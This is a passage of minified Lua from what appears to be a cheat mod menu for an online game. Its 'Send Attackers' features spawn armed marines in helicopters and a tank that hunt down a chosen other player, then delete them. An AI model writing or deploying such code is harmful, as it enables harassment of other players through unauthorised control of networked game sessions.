k=#ArmyTank+1;ArmyTank[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(ArmyTank[k],false)ped.set_ped_combat_attributes(Army5[e],46,true)weapon.give_delayed_weapon_to_ped(Army5[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army5[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army5[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army5[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army5[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army5[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army5[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army5[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army5[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army5[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army5[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army5[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army5[e],1,true)ped.set_ped_combat_attributes(Army5[e],3,false)ped.set_ped_combat_attributes(Army5[e],2,true)ped.set_ped_combat_attributes(Army5[e],52,false)ped.set_ped_combat_attributes(Army5[e],4,true)ped.set_ped_combat_range(Army5[e],2)ped.set_ped_combat_ability(Army5[e],2)ped.set_ped_combat_movement(Army5[e],1)ped.set_ped_max_health(Army5[e],328.0)ped.set_ped_health(Army5[e],328.0)ped.set_ped_config_flag(Army5[e],187,0)ped.set_ped_can_ragdoll(Army5[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army5[e],l)end;ped.set_ped_into_vehicle(Army5[e],ArmyTank[k],-1)while g.on do ai.task_combat_ped(Army5[e],h,0,16)system.wait(25)if entity.is_entity_dead(Army5[e])then return HANDLER_CONTINUE end;for e=1,#Army5 do system.wait(25)ai.task_combat_ped(Army5[e],h,0,16)if utilities.get_distance_between(h,Army5[e])>1000 then network.request_control_of_entity(Army5[e])entity.set_entity_as_no_longer_needed(Army5[e])network.request_control_of_entity(ArmyTank[k])entity.set_entity_as_no_longer_needed(ArmyTank[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Army5 do ped.get_all_peds(Army5[e])system.wait(25)network.request_control_of_entity(Army5[e])entity.set_entity_coords_no_offset(Army5[e],d)entity.set_entity_as_no_longer_needed(Army5[e])entity.delete_entity(Army5[e])end;for k=1,#ArmyTank do vehicle.get_all_vehicles(ArmyTank[k])system.wait(25)network.request_control_of_entity(ArmyTank[k])entity.set_entity_coords_no_offset(ArmyTank[k],d)entity.set_entity_as_no_longer_needed(ArmyTank[k])entity.delete_entity(ArmyTank[k])end end)playerfeature["Send Buzzard"]=menu.add_player_feature("Send Buzzard","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+400;d.y=d.y+0;d.z=d.z+150;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Air3+1;Air3[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air3>=8 then end;entity.set_entity_god_mode(Air3[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x2F03547B;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#AirBuzzard+1;AirBuzzard[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(AirBuzzard[k],false)ped.set_ped_combat_attributes(Air3[e],46,false)weapon.give_delayed_weapon_to_ped(Air3[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air3[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air3[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Air3[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Air3[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Air3[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Air3[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Air3[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Air3[e],1,true)ped.set_ped_combat_attributes(Air3[e],3,true)ped.set_ped_prop_index(Air3[e],0,0,0,0)ped.set_ped_combat_attributes(Air3[e],2,true)ped.set_ped_combat_attributes(Air3[e],52,true)ped.set_ped_combat_attributes(Air3[e],4,true)ped.set_ped_combat_range(Air3[e],2)ped.set_ped_combat_ability(Air3[e],2)ped.set_ped_combat_movement(Air3[e],1)ped.set_ped_max_health(Air3[e],328.0)ped.set_ped_health(Air3[e],328.0)ped.set_ped_config_flag(Air3[e],187,0)ped.set_ped_can_ragdoll(Air3[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air3[e],l)end;ped.set_ped_into_vehicle(Air3[e],AirBuzzard[k],-1)local e=#Air3+1;Air3[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air3>=8 then end;entity.set_entity_god_mode(Air3[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Air3[e],46,true)weapon.give_delayed_weapon_to_ped(Air3[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air3[e],0xDBBD7280,1,1)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0x57EF1CC8)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0x9D65907A)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0xC66B6542)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0x2E7957A)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0xB5E2575B)ped.set_ped_combat_attributes(Air3[e],1,true)ped.set_ped_combat_attributes(Air3[e],3,true)ped.set_ped_prop_index(Air3[e],0,0,0,0)ped.set_ped_combat_attributes(Air3[e],2,true)ped.set_ped_combat_attributes(Air3[e],52,false)ped.set_ped_combat_attributes(Air3[e],4,true)ped.set_ped_combat_range(Air3[e],2)ped.set_ped_combat_ability(Air3[e],2)ped.set_ped_combat_movement(Air3[e],1)ped.set_ped_max_health(Air3[e],328.0)ped.set_ped_health(Air3[e],328.0)ped.set_ped_config_flag(Air3[e],187,0)ped.set_ped_can_ragdoll(Air3[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air3[e],l)end;ped.set_ped_into_vehicle(Air3[e],AirBuzzard[k],1)local e=#Air3+1;Air3[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air3>=8 then end;entity.set_entity_god_mode(Air3[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Air3[e],46,true)weapon.give_delayed_weapon_to_ped(Air3[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air3[e],0xDBBD7280,1,1)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air3[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0x57EF1CC8)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0x9D65907A)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0xC66B6542)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0x2E7957A)weapon.give_weapon_component_to_ped(Air3[e],0xDBBD7280,0xB5E2575B)ped.set_ped_combat_attributes(Air3[e],1,true)ped.set_ped_combat_attributes(Air3[e],3,true)ped.set_ped_prop_index(Air3[e],0,0,0,0)ped.set_ped_combat_attributes(Air3[e],2,true)ped.set_ped_combat_attributes(Air3[e],52,false)ped.set_ped_combat_attributes(Air3[e],4,true)ped.set_ped_combat_range(Air3[e],2)ped.set_ped_combat_ability(Air3[e],2)ped.set_ped_combat_movement(Air3[e],1)ped.set_ped_max_health(Air3[e],328.0)ped.set_ped_health(Air3[e],328.0)ped.set_ped_config_flag(Air3[e],187,0)ped.set_ped_can_ragdoll(Air3[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air3[e],l)end;ped.set_ped_into_vehicle(Air3[e],AirBuzzard[k],2)while g.on do ai.task_combat_ped(Air3[e],h,0,16)system.wait(25)if entity.is_entity_dead(Air3[e])then return HANDLER_CONTINUE end;for e=1,#Air3 do system.wait(25)ai.task_combat_ped(Air3[e],h,0,16)if utilities.get_distance_between(h,Air3[e])>4000 then network.request_control_of_entity(Air3[e])entity.set_entity_as_no_longer_needed(Air3[e])network.request_control_of_entity(AirBuzzard[k])entity.set_entity_as_no_longer_needed(AirBuzzard[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Air3 do ped.get_all_peds(Air3[e])system.wait(25)network.request_control_of_entity(Air3[e])entity.set_entity_coords_no_offset(Air3[e],d)entity.set_entity_as_no_longer_needed(Air3[e])entity.delete_entity(Air3[e])end;for k=1,#AirBuzzard do vehicle.get_all_vehicles(AirBuzzard[k])system.wait(25)network.request_control_of_entity(AirBuzzard[k])entity.set_entity_coords_no_offset(AirBuzzard[k],d)entity.set_entity_as_no_longer_needed(AirBuzzard[k])entity.delete_entity(AirBuzzard[k])end end)playerfeature["Send Savage"]=menu.add_player_feature("Send Savage","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+400;d.y=d.y+0;d.z=d.z+150;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Air6+1;Air6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air6>=8 then end;entity.set_entity_god_mode(Air6[e],false)streaming.set_model_as_no_longer_needed(i)local j=0xFB133A17;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#AirSavage+1;AirSavage[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(AirSavage[k],false)ped.set_ped_combat_attributes(Air6[e],46,true)weapon.give_delayed_weapon_to_ped(Air6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air6[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Air6[e],1,true)ped.set_ped_combat_attributes(Air6[e],3,false)ped.set_ped_combat_attributes(Air6[e],2,true)ped.set_ped_combat_attributes(Air6[e],52,true)ped.set_ped_combat_attributes(Air6[e],4,true)ped.set_ped_combat_attributes(Air6[e],5,true)ped.set_ped_combat_range(Air6[e],2)ped.set_ped_combat_ability(Air6[e],2)ped.set_ped_combat_movement(Air6[e],1)ped.set_ped_max_health(Air6[e],328.0)ped.set_ped_health(Air6[e],328.0)ped.set_ped_config_flag(Air6[e],187,0)ped.set_ped_can_ragdoll(Air6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air6[e],l)end;ped.set_ped_into_vehicle(Air6[e],AirSavage[k],-1)local e=#Air6+1;Air6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air6>=8 then end;entity.set_entity_god_mode(Air6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Air6[e],46,true)weapon.give_delayed_weapon_to_ped(Air6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air6[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Air6[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Air6[e],1,true)ped.set_ped_combat_attributes(Air6[e],3,false)ped.set_ped_combat_attributes(Air6[e],2,true)ped.set_ped_combat_attributes(Air6[e],52,true)ped.set_ped_combat_attributes(Air6[e],4,true)ped.set_ped_combat_range(Air6[e],2)ped.set_ped_combat_ability(Air6[e],2)ped.set_ped_combat_movement(Air6[e],1)ped.set_ped_max_health(Air6[e],328.0)ped.set_ped_health(Air6[e],328.0)ped.set_ped_config_flag(Air6[e],187,0)ped.set_ped_can_ragdoll(Air6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air6[e],l)end;ped.set_ped_into_vehicle(Air6[e],AirSavage[k],0)local e=#Air6+1;Air6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air6>=8 then end;entity.set_entity_god_mode(Air6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Air6[e],46,true)weapon.give_delayed_weapon_to_ped(Air6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air6[e],0xDBBD7280,1,1)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0x57EF1CC8)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0x9D65907A)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0xC66B6542)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0x2E7957A)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0xB5E2575B)ped.set_ped_combat_attributes(Air6[e],1,true)ped.set_ped_combat_attributes(Air6[e],3,false)ped.set_ped_combat_attributes(Air6[e],2,true)ped.set_ped_combat_attributes(Air6[e],52,true)ped.set_ped_combat_attributes(Air6[e],4,true)ped.set_ped_combat_range(Air6[e],2)ped.set_ped_combat_ability(Air6[e],2)ped.set_ped_combat_movement(Air6[e],1)ped.set_ped_max_health(Air6[e],328.0)ped.set_ped_health(Air6[e],328.0)ped.set_ped_config_flag(Air6[e],187,0)ped.set_ped_can_ragdoll(Air6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air6[e],l)end;ped.set_ped_into_vehicle(Air6[e],AirSavage[k],1)local e=#Air6+1;Air6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air6>=8 then end;entity.set_entity_god_mode(Air6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Air6[e],46,true)weapon.give_delayed_weapon_to_ped(Air6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air6[e],0xDBBD7280,1,1)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0x57EF1CC8)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0x9D65907A)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0xC66B6542)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0x2E7957A)weapon.give_weapon_component_to_ped(Air6[e],0xDBBD7280,0xB5E2575B)ped.set_ped_combat_attributes(Air6[e],1,true)ped.set_ped_combat_attributes(Air6[e],3,false)ped.set_ped_combat_attributes(Air6[e],2,true)ped.set_ped_combat_attributes(Air6[e],52,true)ped.set_ped_combat_attributes(Air6[e],4,true)ped.set_ped_combat_range(Air6[e],2)ped.set_ped_combat_ability(Air6[e],2)ped.set_ped_combat_movement(Air6[e],1)ped.set_ped_max_health(Air6[e],328.0)ped.set_ped_health(Air6[e],328.0)ped.set_ped_config_flag(Air6[e],187,0)ped.set_ped_can_ragdoll(Air6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air6[e],l)end;ped.set_ped_into_vehicle(Air6[e],AirSavage[k],2)while g.on do ai.task_combat_ped(Air6[e],h,0,16)system.wait(25)if entity.is_entity_dead(Air6[e])then return HANDLER_CONTINUE end;for e=1,#Air6 do system.wait(25)ai.task_combat_ped(Air6[e],h,0,16)if utilities.get_distance_between(h,Air6[e])>4000 then network.request_control_of_entity(Air6[e])entity.set_entity_as_no_longer_needed(Air6[e])network.request_control_of_entity(AirSavage[k])entity.set_entity_as_no_longer_needed(AirSavage[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Air6 do ped.get_all_peds(Air6[e])system.wait(25)network.request_control_of_entity(Air6[e])entity.set_entity_coords_no_offset(Air6[e],d)entity.set_entity_as_no_longer_needed(Air6[e])entity.delete_entity(Air6[e])end;for k=1,#AirSavage do vehicle.get_all_vehicles(AirSavage[k])system.wait(25)network.request_control_of_entity(AirSavage[k])entity.set_entity_coords_no_offset(AirSavage[k],d)entity.set_entity_as_no_longer_needed(AirSavage[k])entity.delete_entity(AirSavage[k])end end)playerfeature["Send Valkyrie"]=menu.add_player_feature("Send Valkyrie","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+400;d.y=d.y+0;d.z=d.z+150;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Air2+1;Air2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air2>=8 then end;entity.set_entity_god_mode(Air2[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x5BFA5C4B;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#AirValkyrie+1;AirValkyrie[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(AirValkyrie[k],false)vehicle.set_vehicle_mod_kit_type(AirValkyrie[k],0)vehicle.get_vehicle_mod(AirValkyrie[k],40)vehicle.set_vehicle_mod(AirValkyrie[k],40,3,true)ped.set_ped_combat_attributes(Air2[e],46,true)weapon.give_delayed_weapon_to_ped(Air2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_prop_index(Air2[e],0,0,0,0)ped.set_ped_combat_attributes(Air2[e],1,true)ped.set_ped_combat_attributes(Air2[e],3,false)ped.set_ped_combat_attributes(Air2[e],2,false)ped.set_ped_combat_attributes(Air2[e],52,false)ped.set_ped_combat_attributes(Air2[e],4,true)ped.set_ped_combat_range(Air2[e],2)ped.set_ped_combat_ability(Air2[e],2)ped.set_ped_combat_movement(Air2[e],1)ped.set_ped_max_health(Air2[e],328.0)ped.set_ped_health(Air2[e],328.0)ped.set_ped_config_flag(Air2[e],187,0)ped.set_ped_can_ragdoll(Air2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air2[e],l)end;ped.set_ped_into_vehicle(Air2[e],AirValkyrie[k],-1)local e=#Air2+1;Air2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air2>=8 then end;entity.set_entity_god_mode(Air2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Air2[e],46,true)weapon.give_delayed_weapon_to_ped(Air2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_prop_index(Air2[e],0,0,0,0)ped.set_ped_combat_attributes(Air2[e],1,true)ped.set_ped_combat_attributes(Air2[e],3,false)ped.set_ped_combat_attributes(Air2[e],2,true)ped.set_ped_combat_attributes(Air2[e],52,false)ped.set_ped_combat_attributes(Air2[e],4,true)ped.set_ped_combat_range(Air2[e],2)ped.set_ped_combat_ability(Air2[e],2)ped.set_ped_combat_movement(Air2[e],1)ped.set_ped_max_health(Air2[e],328.0)ped.set_ped_health(Air2[e],328.0)ped.set_ped_config_flag(Air2[e],187,0)ped.set_ped_can_ragdoll(Air2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air2[e],l)end;ped.set_ped_into_vehicle(Air2[e],AirValkyrie[k],1)local e=#Air2+1;Air2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air2>=8 then end;entity.set_entity_god_mode(Air2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Air2[e],46,true)weapon.give_delayed_weapon_to_ped(Air2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Air2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_prop_index(Air2[e],0,0,0,0)ped.set_ped_combat_attributes(Air2[e],1,true)ped.set_ped_combat_attributes(Air2[e],3,false)ped.set_ped_combat_attributes(Air2[e],2,true)ped.set_ped_combat_attributes(Air2[e],52,false)ped.set_ped_combat_attributes(Air2[e],4,true)ped.set_ped_combat_range(Air2[e],2)ped.set_ped_combat_ability(Air2[e],2)ped.set_ped_combat_movement(Air2[e],1)ped.set_ped_max_health(Air2[e],328.0)ped.set_ped_health(Air2[e],328.0)ped.set_ped_config_flag(Air2[e],187,0)ped.set_ped_can_ragdoll(Air2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air2[e],l)end;ped.set_ped_into_vehicle(Air2[e],AirValkyrie[k],2)while g.on do ai.task_combat_ped(Air2[e],h,0,16)system.wait(25)if entity.is_entity_dead(Air2[e])then return HANDLER_CONTINUE end;for e=1,#Air2 do system.wait(25)ai.task_combat_ped(Air2[e],h,0,16)if utilities.get_distance_between(h,Air2[e])>4000 then network.request_control_of_entity(Air2[e])entity.set_entity_as_no_longer_needed(Air2[e])network.request_control_of_entity(AirValkyrie[k])entity.set_entity_as_no_longer_needed(AirValkyrie[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Air2 do ped.get_all_peds(Air2[e])system.wait(25)network.request_control_of_entity(Air2[e])entity.set_entity_coords_no_offset(Air2[e],d)entity.set_entity_as_no_longer_needed(Air2[e])entity.delete_entity(Air2[e])end;for k=1,#AirValkyrie do vehicle.get_all_vehicles(AirValkyrie[k])system.wait(25)network.request_control_of_entity(AirValkyrie[k])entity.set_entity_coords_no_offset(AirValkyrie[k],d)entity.set_entity_as_no_longer_needed(AirValkyrie[k])entity.delete_entity(AirValkyrie[k])end end)playerfeature["Send Hunter"]=menu.add_player_feature("Send Hunter","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+400;d.y=d.y+0;d.z=d.z+150;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Air1+1;Air1[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air1>=8 then end;entity.set_entity_god_mode(Air1[e],false)streaming.set_model_as_no_longer_needed(i)local j=0xFD707EDE;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#AirHunter+1;AirHunter[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(AirHunter[k],false)vehicle.set_vehicle_mod_kit_type(AirHunter[k],0)vehicle.get_vehicle_mod(AirHunter[k],10)vehicle.set_vehicle_mod(AirHunter[k],10,0,false)ped.set_ped_combat_attributes(Air1[e],46,true)weapon.give_delayed_weapon_to_ped(Air1[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Air1[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Air1[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Air1[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Air1[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Air1[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_prop_index(Air1[e],0,0,0,0)ped.set_ped_combat_attributes(Air1[e],1,true)ped.set_ped_combat_attributes(Air1[e],3,false)ped.set_ped_combat_attributes(Air1[e],2,false)ped.set_ped_combat_attributes(Air1[e],52,false)ped.set_ped_combat_attributes(Air1[e],4,true)ped.set_ped_combat_range(Air1[e],2)ped.set_ped_combat_ability(Air1[e],2)ped.set_ped_combat_movement(Air1[e],1)ped.set_ped_max_health(Air1[e],328.0)ped.set_ped_health(Air1[e],328.0)ped.set_ped_config_flag(Air1[e],187,0)ped.set_ped_can_ragdoll(Air1[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Air1[e],l)end;ped.set_ped_into_vehicle(Air1[e],AirHunter[k],-1)local e=#Air1+1;Air1[e]=ped.create_ped(6,i,d,d.z,true,false)if#Air1>=8 then 